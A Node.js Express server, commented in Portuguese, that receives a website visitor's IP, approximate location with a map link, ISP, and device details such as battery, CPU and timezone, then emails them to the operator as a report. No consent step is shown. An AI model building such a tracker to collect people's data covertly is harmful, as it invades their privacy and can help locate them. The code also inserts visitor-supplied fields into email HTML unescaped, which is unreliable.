require('dotenv').config();
const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

// Página inicial
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Recebe dados do cliente e envia por e-mail
app.post('/dados-cliente', async (req, res) => {
    try {
        const dados = req.body;

        // Formatar localização
        const localizacao = (dados.ipInfo.latitude && dados.ipInfo.longitude && dados.ipInfo.latitude !== 'Indisponível')
            ? `https://www.google.com/maps/search/?api=1&query=${dados.ipInfo.latitude},${dados.ipInfo.longitude}`
            : 'Indisponível';

        const corpoEmail = `
📌 <strong>DADOS DA MÁQUINA DO CLIENTE</strong>

🌐 <strong>INFORMAÇÕES DE REDE:</strong><br>
🌍 <strong>IP Público:</strong> ${dados.ipInfo.ip || 'N/D'}<br>
🏳️ <strong>País:</strong> ${dados.ipInfo.pais || 'N/D'}<br>
🏙️ <strong>Região:</strong> ${dados.ipInfo.regiao || 'N/D'}<br>
🏢 <strong>Cidade:</strong> ${dados.ipInfo.cidade || 'N/D'}<br>
📮 <strong>CEP:</strong> ${dados.ipInfo.cep || 'N/D'}<br>
📍 <strong>Localização:</strong> <a href="${localizacao}" target="_blank">Ver no Mapa</a><br>
📡 <strong>Provedor:</strong> ${dados.ipInfo.provedor || 'N/D'}<br>
📶 <strong>Tipo de Conexão:</strong> ${dados.conexao.tipo || 'N/D'}<br>
⬇️ <strong>Velocidade de Download:</strong> ${dados.conexao.velocidade || 'N/D'}<br>
📈 <strong>Latência (RTT):</strong> ${dados.conexao.latencia || 'N/D'}<br>

💻 <strong>INFORMAÇÕES DO DISPOSITIVO:</strong><br>
🧭 <strong>Navegador:</strong> ${dados.navegador || 'N/D'}<br>
💻 <strong>Plataforma:</strong> ${dados.plataforma || 'N/D'}<br>
🖥️ <strong>Resolução da Tela:</strong> ${dados.resolucao || 'N/D'}<br>
🔋 <strong>Nível de Bateria:</strong> ${dados.bateria || 'N/D'}<br>
🧠 <strong>Memória:</strong> ${dados.memoriaDisponivel || 'N/D'}<br>
⚙️ <strong>Núcleos CPU:</strong> ${dados.coresCPU || 'N/D'}<br>
🖱️ <strong>Touchscreen:</strong> ${dados.touchscreen || 'N/D'}<br>
🍪 <strong>Cookies Habilitados:</strong> ${dados.cookiesHabilitados || 'N/D'}<br>
📱 Tipo de Dispositivo: ${dados.tipoDispositivo || 'N/D'}<br>

🗣️ <strong>CONFIGURAÇÕES:</strong><br>
🗣️ <strong>Idioma:</strong> ${dados.idioma || 'N/D'}<br>
⏰ <strong>Fuso Horário:</strong> ${dados.timezone || 'N/D'}<br>
📅 <strong>Data e Hora da Coleta:</strong> ${new Date(dados.dataHora).toLocaleString() || 'N/D'}<br>
🕓 Horário de Entrada no Site: ${dados.horarioEntrada || 'N/D'}<br>
`.trim();

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASS,
            },
        });

        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_TO,
            subject: '📬 Relatório Completo da Máquina do Cliente',
            html: corpoEmail
        });

        console.log('✅ Dados enviados por e-mail.');
        res.send('Dados enviados com sucesso!');
    } catch (err) {
        console.error('❌ Erro ao enviar dados:', err);
        res.status(500).send('Erro ao enviar os dados.');
    }
});

app.listen(port, () => {
    console.log(`🚀 Servidor rodando em http://localhost:${port}`);
});
